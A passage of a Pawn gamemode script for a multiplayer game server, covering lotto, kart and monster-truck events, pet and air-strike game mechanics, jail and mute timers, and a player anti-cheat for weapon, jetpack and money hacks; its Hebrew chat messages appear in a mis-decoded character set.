				playerinfo[i][inact] = 1;
				playerinfo[i][inwwe] = 1, playerinfo[i][waitwwe] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(wweinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartWWE2");
	return 1;
}
//=[UnFreeze]===================================================================
public UnFreeze(playerid) return SetFreeze(playerid,0);
//=[StartActivity2]=============================================================
public StartActivity2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartActivity2");
	new rnd = random(4);
	switch(rnd)
	{
		case 0: Lotto();
		case 1: Math();
		case 2: Trivia();
		case 3: Replytest();
	}
	if(debugstate) printf("Gamemode Activity [end]: StartActivity2");
	return 1;
}
//=[Lotto]======================================================================
public Lotto()
{
	if(debugstate) printf("Gamemode Activity [start]: Lotto");
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !äâøìú äìåèå îúçéìä òëùéå! îñôø à÷øàé áéï 1 ì 50 äåâøì");
	SendClientMessageToAll(green," /lotto [1-50] :ðñå àú îæìëí");
	SendClientMessageToAll(orange,"  äøàùåï ùéðçù àú äîñôø ééæëä áñëåí ëñôé îñåééí");
	SendClientMessageToAll(orange,"  áîéãä åìà éäéä æåëä úåê çöé ã÷ä ääâøìä úâîø");
	SendClientMessageToAll(yellow," /lottohelp :ìòæøä òí îòøëú äìåèå");
	SendClientMessageToAll(black,"___________________________________");
	lottonum[0] = randomEx(1,51);
	SetTimer("Lotto2",30000,0);
	if(debugstate) printf("Gamemode Activity [end]: Lotto");
	return 1;
}
//=[Lotto2]=====================================================================
public Lotto2()
{
	if(debugstate) printf("Gamemode Activity [start]: Lotto2");
	new string[M_S];
	if(lottonum[1] == -1 || !IsPlayerConnected(lottonum[1]))
	{
		format(string,sizeof(string)," .àó àçã ìà æëä áìåèå! äîñôø äéä %d",lottonum);
		SendClientMessageToAll(red,string);
	}
	else
	{
		new pay = randomEx(100000,750001);
		SendClientMessage(lottonum[1],green," !äðéçåù ùìê ðëåï");
		format(string,sizeof(string)," !æëä áìåèå å÷éáì %d$ %s",pay,GetName(lottonum[1]));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string)," .äîñôø äéä %d",lottonum);
		SendClientMessageToAll(green,string);
		GiveMoney(lottonum[1],pay);
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][plotto] == lottonum[0] && lottonum[1] != i) SendClientMessage(i,red," .àúä àåîðí âí ðéçùú àú äîñôø äðëåï, àê äîðöç ä÷ãéí àåúê");
	}
	lottonum = {-1,-1};
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) playerinfo[i][plotto] = -1;
	if(debugstate) printf("Gamemode Activity [end]: Lotto2");
	return 1;
}
//=[PetAttacking]===============================================================
public PetAttacking(playerid,id)
{
	if(debugstate) printf("PetAttacking(%s(%d),%s(%d)) start",GetName(playerid),playerid,GetName(id),id);
	new Float:p[4], Float:h, Float:a, Float:vh, Float:z;
	GetPlayerPos(id,p[0],p[1],p[2]);
	GetPlayerHealth(id,h);
	z = p[2];
	if(h >= 0.0 && ObjectToPoint(GetPetRadius(playerinfo[playerid][pet][0]),playerinfo[playerid][pet][1],p[0],p[1],p[2]))
	{
		GetSObjectPos(playerinfo[playerid][pet][1],p[0],p[1],p[2]);
		if(ObjectToPoint(GetPetAttackRadius(playerinfo[playerid][pet][0]),playerinfo[playerid][pet][1],p[0],p[1],p[2]) && p[2] <= z + 10.0  && p[2] >= z - 10.0)
		{
			if(IsPlayerInAnyVehicle(id))
			{
				GetVehicleHealth(GetPlayerVehicleID(id),vh);
				if(vh >= 0.0) SetVehicleHealth(GetPlayerVehicleID(id),vh-GetPetDamage(playerinfo[playerid][pet][0]));
			}
			else
			{
				GetPlayerHealth(id,h);
				GetPlayerArmour(id,a);
				if(a >= 0.0) SetPlayerArmour2(id,a-GetPetDamage(playerinfo[playerid][pet][0]));
				else SetPlayerHealth2(id,h-GetPetDamage(playerinfo[playerid][pet][0]));
			}
		}
		new Float:at, Float:op[3], Float:or[3];
		GetSObjectPos(playerinfo[playerid][pet][1],op[0],op[1],op[2]);
		GetSObjectRot(playerinfo[playerid][pet][1],or[0],or[1],or[2]);
		GetPlayerPos(id,p[0],p[1],p[2]);
		at = atan2(op[1]-p[1],op[0]-p[0]);
		MoveSObject(playerinfo[playerid][pet][1],p[0],p[1],p[2],GetPetSpeed(playerinfo[playerid][pet][0]));
		SetSObjectRot(playerinfo[playerid][pet][1],or[0],or[1],at+90.0);
		//StopObject(playerinfo[playerid][pet][1]);
		//MoveSObject(playerinfo[playerid][pet][1],p[0],p[1],p[2],GetPetSpeed(playerinfo[playerid][pet][0]));
	}
	else
	{
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(!ObjectToPoint(GetPetRadius(playerinfo[playerid][pet][0]),playerinfo[playerid][pet][1],p[0],p[1],p[2])) SendClientMessage(playerid,red," !ä÷åøáï äúøç÷ îèååç äøàééä ùì äçéä ùìê");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		playerinfo[playerid][pet][3] = 0;
		AttachSObjectToPlayer(playerinfo[playerid][pet][1],playerid,playerinfo[playerid][pet][0] >= pet_turtle? 6.5:2.8,0.0,0.0,0.0,0.0,0.0);
		KillTimer(playerinfo[playerid][pet][4]);
	}
	if(debugstate) printf("PetAttacking(%s(%d),%s(%d)) end",GetName(playerid),playerid,GetName(id),id);
	return 1;
}
//=[UnMute]=====================================================================
public UnMute(playerid)
{
	if(playerinfo[playerid][mute][0] > 0) playerinfo[playerid][mute][0]--;
	else if(playerinfo[playerid][mute][0] == 0)
	{
		SendClientMessage(playerid,white," .äùú÷úê éøãä");
		KillTimer(playerinfo[playerid][mute][1]);
		playerinfo[playerid][mute][0] = -1;
	}
	return 1;
}
//=[UnJail]=====================================================================
public UnJail(playerid)
{
	if(playerinfo[playerid][jail][0] > 0)
	{
		playerinfo[playerid][jail][0]--;
		SetPlayerPos(playerid,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(playerid,270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,6);
		SetFreeze(playerid,1);
		TogglePlayerControllable(playerid,0);
	}
	else if(playerinfo[playerid][jail][0] == 0)
	{
		SendClientMessage(playerid,white," .ùåçøøú îäëìà");
		SetPlayerInterior(playerid,0);
		SpawnPlayer(playerid);
		SetFreeze(playerid,0);
		playerinfo[playerid][jail][0] = 0;
		KillTimer(playerinfo[playerid][jail][1]);
	}
	return 1;
}
//=[AirAttack1]=================================================================
public AirAttack1(playerid)
{
	if(debugstate) printf("AirAttack1(%s(%d)) start",GetName(playerid),playerid);
	new Float:vp[3];
	GetVehiclePos(playerinfo[playerid][aav1],vp[0],vp[1],vp[2]);
	if(vp[1] != (playerinfo[playerid][aapos][1]+200))
	{
		playerinfo[playerid][aasetp] += 10;
		DestroyVehicleEx(playerinfo[playerid][aav1]);
		playerinfo[playerid][aav1] = CreateVehicleEx(520,playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
	}
	else if(vp[1] == (playerinfo[playerid][aapos][1]+200))
	{
		DestroyVehicleEx(playerinfo[playerid][aav1]);
		playerinfo[playerid][aause] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	if(vp[1] > (playerinfo[playerid][aapos][1]-10.0) && vp[1] < (playerinfo[playerid][aapos][1]+10.0))
	{
		CreateExplosion(playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,15.0);
		CreateExplosion(playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,15.0);
	}
	if(debugstate) printf("AirAttack1(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[AirAttack2]=================================================================
public AirAttack2(playerid)
{
	if(debugstate) printf("AirAttack2(%s(%d)) start",GetName(playerid),playerid);
	new Float:vp[3][2];
	for(new i=0;i<2;i++) GetVehiclePos(playerinfo[playerid][aav2][i],vp[0][i],vp[1][i],vp[2][i]);
	if(vp[1][0] != (playerinfo[playerid][aapos][1]+200) && vp[1][1] != (playerinfo[playerid][aapos][1]+200))
	{
		playerinfo[playerid][aasetp] += 5;
		for(new i=0;i<2;i++) DestroyVehicleEx(playerinfo[playerid][aav2][i]);
		playerinfo[playerid][aav2][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav2][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
	}
	else if(vp[1][0] == (playerinfo[playerid][aapos][1]+200) && vp[1][1] == (playerinfo[playerid][aapos][1]+200))
	{
		for(new i=0;i<2;i++) DestroyVehicleEx(playerinfo[playerid][aav2][i]);
		playerinfo[playerid][aause] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	if((vp[1][0] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][0] < (playerinfo[playerid][aapos][1]+10.0)) && (vp[1][1] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][1] < (playerinfo[playerid][aapos][1]+10.0)))
	{
		CreateExplosion(playerinfo[playerid][aapos][0]-10.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,15.0);
		CreateExplosion(playerinfo[playerid][aapos][0]+10.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,15.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-10.0,playerinfo[playerid][aapos][2],7,15.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+10.0,playerinfo[playerid][aapos][2],7,15.0);
	}
	if(debugstate) printf("AirAttack2(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[AirAttack3]=================================================================
public AirAttack3(playerid)
{
	if(debugstate) printf("AirAttack3(%s(%d)) start",GetName(playerid),playerid);
	new Float:vp[3][4], Float:p200 = (playerinfo[playerid][aapos][1]+200);
	for(new i=0;i<4;i++) GetVehiclePos(playerinfo[playerid][aav3][i],vp[0][i],vp[1][i],vp[2][i]);
	if(vp[1][0] != p200 && vp[1][1] != p200 && vp[1][2] != p200 && vp[1][3] != p200)
	{
		playerinfo[playerid][aasetp] += 5;
		for(new i=0;i<4;i++) DestroyVehicleEx(playerinfo[playerid][aav3][i]);
		playerinfo[playerid][aav3][0] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]-5.2,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][1] = CreateVehicleEx(425,playerinfo[playerid][aapos][0]+5.2,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][2] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]-12.5,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][aav3][3] = CreateVehicleEx(520,playerinfo[playerid][aapos][0]+12.5,playerinfo[playerid][aapos][1]+playerinfo[playerid][aasetp],playerinfo[playerid][aapos][2]+57.0,0.0,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
	}
	else if(vp[1][0] == p200 && vp[1][1] == p200 && vp[1][2] == p200 && vp[1][3] == p200)
	{
		for(new i=0;i<4;i++) DestroyVehicleEx(playerinfo[playerid][aav3][i]);
		playerinfo[playerid][aause] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	if((vp[1][0] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][0] < (playerinfo[playerid][aapos][1]+10.0)) &&
	(vp[1][1] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][1] < (playerinfo[playerid][aapos][1]+10.0)) &&
	(vp[1][2] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][2] < (playerinfo[playerid][aapos][1]+10.0)) &&
	(vp[1][3] > (playerinfo[playerid][aapos][1]-10.0) && vp[1][3] < (playerinfo[playerid][aapos][1]+10.0)))
	{
		CreateExplosion(playerinfo[playerid][aapos][0]-5.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0]+5.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-5.0,playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+5.0,playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0]+10.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0]-10.0,playerinfo[playerid][aapos][1],playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]+10.0,playerinfo[playerid][aapos][2],7,20.0);
		CreateExplosion(playerinfo[playerid][aapos][0],playerinfo[playerid][aapos][1]-10.0,playerinfo[playerid][aapos][2],7,20.0);
	}
	if(debugstate) printf("AirAttack3(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[CountDown]=================================================================
public CountDown(withf)
{
	if(debugstate) printf("CountDown(%d) start",withf);
	if(cd[1] <= 0)
	{
		GameTextForAll("~g~go~r~!",2000,4);
		KillTimer(cd[2]);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				if(!playerinfo[i][modeafk]) PlayerPlaySound(i,1057,0.0,0.0,0.0);
				if(withf) SetFreeze(i,0);
			}
		}
		cd[0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~b~%d",cd[1]);
		GameTextForAll(string,2000,4);
	}
	cd[1]--;
	if(debugstate) printf("CountDown(%d) end",withf);
	return 1;
}
//=[StartKart]==================================================================
public StartKart()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKart");
	new string[M_S];
	if(ThereIsAct()) return 0;
	kartinfo[0] = 1, kartinfo[1] = 0, kartinfo[2] = 60, kartinfo[3] = SetTimer("StartKart2",1000,1);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !úúçéì á÷øåá Kart úçøåú ä");
	SendClientMessageToAll(green," /kart join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .òåìä 300$ Kart äöèøôåú ìúçøåú ä");
	SendClientMessageToAll(orange," /karthelp :øùîå àú äô÷åãä Kart ìîéãò ðåñó òì îòøëú ä");
	format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Kart úçøåú ä",kartinfo[2]);
	SendClientMessageToAll(brown,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartKart");
	return 1;
}
//=[StartKart2]=================================================================
public StartKart2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKart2");
	new string[M_S];
	kartinfo[2]--;
	if(kartinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(kartinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~g~Kart: ~h~%d",kartinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(kartinfo[2] == 15 || kartinfo[2] == 30)
		{
			format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Kart úçøåú ä",kartinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /kart join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(kartinfo[2] == 5)
	{
		if(kartinfo[1] < 2) return EndKart(" îñôø äùç÷ðéí ùäöèøôå ÷èï î2",-1);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkart])
			{
				SetFreeze(i,1);
				ResetWeapons(i);
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				SetPlayerVirtualWorld(i,world_kart);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				PutPlayerInVehicle(i,playerinfo[i][kartv],0);
				SetPlayerInterior(i,0);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(playerinfo[i][kartv],1000.0);
				ResetWeapons(i);
				vehicleinfo[playerinfo[i][kartv]][kartdriver] = i;
				PlayerPlaySound(i,1062,0.0,0.0,0.0);
				SendClientMessage(i,orange," !Kartáäöìçä áúçøåú ä");
			}
		}
	}
	if(kartinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkart])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][inkart] = 1, playerinfo[i][waitkart] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(kartinfo[3]);
		kartinfo[3] = SetTimer("CheckKart",1000,1);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartKart2");
	return 1;
}
//=[CheckKart]==================================================================
public CheckKart()
{
	if(debugstate) printf("Gamemode Activity [start]: CheckKart");
	new string[M_S];
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && playerinfo[i][inkart])
		{
			if(kartinfo[1] == 1)
			{
				format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
				MovingText(string,mt_activity);
				format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
				SendClientMessageToAll(yellow,string);
				SetPlayerInterior(i,0);
				vehicleinfo[GetPlayerVehicleID(i)][kartdriver] = INVALID_PLAYER_ID;
				DestroyVehicleEx(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				GiveMoney(i,40000);
				playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
				kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
				playerinfo[i][inact] = 0;
				KillTimer(kartinfo[3]);
				PlayerPlaySound(i,1063,0.0,0.0,0.0);
			}
			else
			{
				new Float:p[3];
				GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
				if(p[2] < (KartPositions[0][2]-3.0))
				{
					playerinfo[i][waitkart] = 0, playerinfo[i][inkart] = 0;
					SetPlayerVirtualWorld(i,world_normal);
					vehicleinfo[GetPlayerVehicleID(i)][kartdriver] = INVALID_PLAYER_ID;
					DestroyVehicleEx(GetPlayerVehicleID(i));
					SpawnPlayer(i);
					kartinfo[1]--;
					playerinfo[i][inact] = 0;
					SendClientMessage(i,red," .Kart äôñãú áúçøåú ä");
					PlayerPlaySound(i,1063,0.0,0.0,0.0);
				}
			}
		}
	}
	if(debugstate) printf("Gamemode Activity [end]: CheckKart");
	return 1;
}
//=[StartMonster]===============================================================
public StartMonster()
{
	if(debugstate) printf("Gamemode Activity [start]: StartMonster");
	new string[M_S];
	if(ThereIsAct()) return 0;
	monsterinfo[0] = 1, monsterinfo[1] = 0, monsterinfo[2] = 60, monsterinfo[3] = SetTimer("StartMonster2",1000,1);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !úúçéì á÷øåá Monster úçøåú ä");
	SendClientMessageToAll(green," /monster join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .òåìä 300$ Monster äöèøôåú ìúçøåú ä");
	SendClientMessageToAll(orange," /monsterhelp :øùîå àú äô÷åãä Monster ìîéãò ðåñó òì îòøëú ä");
	format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Monster úçøåú ä",monsterinfo[2]);
	SendClientMessageToAll(brown,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartMonster");
	return 1;
}
//=[StartMonster2]==============================================================
public StartMonster2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartMonster2");
	new string[M_S];
	monsterinfo[2]--;
	if(monsterinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(monsterinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~p~Monster: ~h~%d",monsterinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(monsterinfo[2] == 15 || monsterinfo[2] == 30)
		{
			format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Monster úçøåú ä",monsterinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /monster join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(monsterinfo[2] == 5)
	{
		if(monsterinfo[1] < 2) return EndMonster(" îñôø äùç÷ðéí ùäöèøôå ÷èï î2",-1);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmonster])
			{
				SetFreeze(i,1);
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_monster);
				SetVehicleVirtualWorld(playerinfo[i][monsterv],world_monster);
				SetPlayerInterior(i,15);
				LinkVehicleToInterior(playerinfo[i][monsterv],15);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				PutPlayerInVehicle(i,playerinfo[i][monsterv],0);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(playerinfo[i][monsterv],1000.0);
				ResetWeapons(i);
				vehicleinfo[playerinfo[i][monsterv]][monsterdriver] = i;
				SendClientMessage(i,orange," !Monsteráäöìçä áúçøåú ä");
				PlayerPlaySound(i,1085,0.0,0.0,0.0);
			}
		}
	}
	if(monsterinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitmonster])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][inmonster] = 1, playerinfo[i][waitmonster] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(monsterinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartMonster2");
	return 1;
}
//=[CheckpointsSystem]==========================================================
public CheckpointsSystem()
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i))
		{
			new cpid = pcp(i);
			if(playerinfo[i][cp] != cpid)
			{
				DisablePlayerCheckpoint(i);
				playerinfo[i][cp] = cpid;
				if(cpid != -1) SetPlayerCheckpoint(i,cpinfo[cpid][cpx],cpinfo[cpid][cpy],cpinfo[cpid][cpz],cpinfo[cpid][cpsize]);
			}
			playerinfo[i][cp] = cpid;
		}
		else playerinfo[i][cp] = -1;
	}
	return 1;
}
//=[OnPlayerTeamPrivmsg]========================================================
public OnPlayerTeamPrivmsg(playerid,msg[])
{
	SendClientMessage(playerid,red," .îòøëú äèéí ö'àè ùì äñàîô áåèìä");
	return 0;
}
//=[AntiCheat]==================================================================
public AntiCheat()
{
	new ww[2];
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerMAdmin(i))
		{
			// Weapon hack
			if(!playerinfo[i][gw] && playerinfo[i][dmzone] == dmz_none)
			{
				for(new w=0;w<13;w++)
				{
					GetPlayerWeaponData(i,w,ww[0],ww[1]);
					for(new a=0;a<sizeof(badweapons);a++) if(ww[0] == badweapons[a] || (ww[0] == 35 && (playerinfo[i][weapons][6] != 35 || playerinfo[i][level] < 4))) return Cheat(i,"Weapons hack");
				}
			}
			// Jetpack hack
			if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && playerinfo[i][level] < 17 && !playerinfo[i][jetpack] && !playerinfo[i][inact]) return Cheat(i,"Jetpack hack");
			// Spectate hack
			if(GetPlayerState(i) == PLAYER_STATE_SPECTATING && !IsPlayerMAdmin(i) && !playerinfo[i][viewerwwe]) return Cheat(i,"Spectate hack");
		}
	}
	return 1;
}
//=[Contents2]==================================================================
public Contents2()
{
	new Float:a, string[M_S], Float:p[3];
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			#if DFairPlay == false
				if(!IsPlayerMAdmin(i))
				{
					// Money hack
					#if acmoney == 2
						if(GetMoney(i) <= playerinfo[i][money][0] && !playerinfo[i][money][2]) playerinfo[i][moneywarns] = 0, playerinfo[i][money][0] = GetMoney(i);
						else
						{
							if(GetMoney(i) > playerinfo[i][money][0]+1000 && !playerinfo[i][money][2])
			 				{
			   					if(playerinfo[i][money][1] >= GetMoney(i)) playerinfo[i][money][1] = GetMoney(i), playerinfo[i][money][0] = GetMoney(i);
								else
			 		   			{
			 						playerinfo[i][moneywarns]++;
				  	   				if(playerinfo[i][moneywarns] == 2) return Cheat(i,"Money hack");
								}
							}
						}
			   			playerinfo[i][money][2] = 0;
					#elseif acmoney == 1
			   			if(GetMoney(i) > playerinfo[i][money][0])
			   			{
			   				playerinfo[i][money][1]++;
							format(string,sizeof(string)," .ðà ìà ìäùúîù áö'éè ëñó. àæäøä %d îúåê 3",playerinfo[i][money][1]);
			   				SendClientMessage(i,red,string);
			   				format(string,sizeof(string),"Money hack try %d (%d$)",playerinfo[i][money][1],GetMoney(i)-playerinfo[i][money][0]);
							Log("Cheating",i,string);
							ResetPlayerMoney(i);
			   				if(playerinfo[i][money][1] >= 3) return Cheat(i,"Money hack");
			   			}
		   			#endif
				}
			#endif
			// Class Selection
			if(playerinfo[i][reqclass] && playerinfo[i][classselection] == 2)
			{
				GetPlayerFacingAngle(i,a);
				SetPlayerFacingAngle(i,(a + 1.0) >= 359.0 ? 0.0 : (a + 1.0));
			}
			// Raise Update
			if(playerinfo[i][raise] != INVALID_PLAYER_ID)
			{
			    GetPlayerPos(i,p[0],p[1],p[2]);
			    SetPlayerPos(playerinfo[i][raise],p[0],p[1],p[2] - 2.0);
			}
			// Mapolet
			if(playerinfo[i][mapolet][0] > 0)
			{
			    new num = 0;
			    for(new x = 0; x < 7; x++) if(playerinfo[i][mapolet][x] > 0) num++;
			    for(new x = 0; x < num; x++)
			    {
			        GetSObjectPos(playerinfo[i][mapolet][x],p[0],p[1],p[2]);
			        if(p[2] == playerinfo[i][mapoletstart][x]-9.0) CreateExplosion(p[0],p[1],p[2],6,0.3);
			        if(p[2] == playerinfo[i][mapoletstart][x]-11.0)
					{
						DestroyObject(playerinfo[i][mapolet][x]);
						playerinfo[i][mapoletstart][x] = 0.0;
						playerinfo[i][mapolet][x] = 0;
					}
			    }
			}
			// Pump Update
			if(playerinfo[i][pump] != INVALID_PLAYER_ID)
			{
				GetPlayerPos(playerinfo[i][pump],p[0],p[1],p[2]);
				if(GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 9.0)
				{
				    Damage(playerinfo[i][pump],3.5);
				    Damage(i,-3.5);
				}
				else
				{
					SendClientMessage(i,red," .ùàéáú äçééí äåôñ÷ä ëé äùç÷ï ùùàáú îîðå çééí äúøç÷");
					SendClientMessage(playerinfo[i][pump],red," .ùàéáú äçééí äåôñ÷ä ëé äúøç÷ú îäùç÷ï ùùàá îîê");
					playerinfo[i][pump] = INVALID_PLAYER_ID;
				}
			}
			// No Reload
			if(playerinfo[i][nr] && IsPlayerMAdmin(i)) GiveWeapon(i,GetPlayerWeapon(i),2);
			// Anti Bank / Ammunation Shooting
			if((GetPlayerCheckpoint(i) == cp_bank || GetPlayerCheckpoint(i) == cp_ammu) && playerinfo[i][spectate] == -1 && GetPlayerInterior(i) != 0 && !IsPlayerMAdmin(i) && GetPlayerWeapon(i) != 1 && GetPlayerWeapon(i) != 0)
			{
				SetPlayerArmedWeapon(i,playerinfo[i][weapons][8] != 0 ? 1 : 0);
				SetFreeze(i,0);
				PlayerPlaySound(i,1085,0.0,0.0,0.0);
			}
		}
	}
	return 1;
}
//=[CanA]=======================================================================
public CanA(playerid)
{
	playerinfo[playerid][cana] = 1;
	return 1;
}
//=[CanS]=======================================================================
public CanS(playerid)
{
	playerinfo[playerid][cans] = 1;
	return 1;
}
//=[CanAFK]=====================================================================
public CanAFK(playerid)
{
	playerinfo[playerid][canafk] = 1;
	return 1;
}
//=[BotWrite2]==================================================================
public BotWrite2()
{
	botwrite = 1;
	return 1;
}
//=[StartSRace]=================================================================
public StartSRace()
{
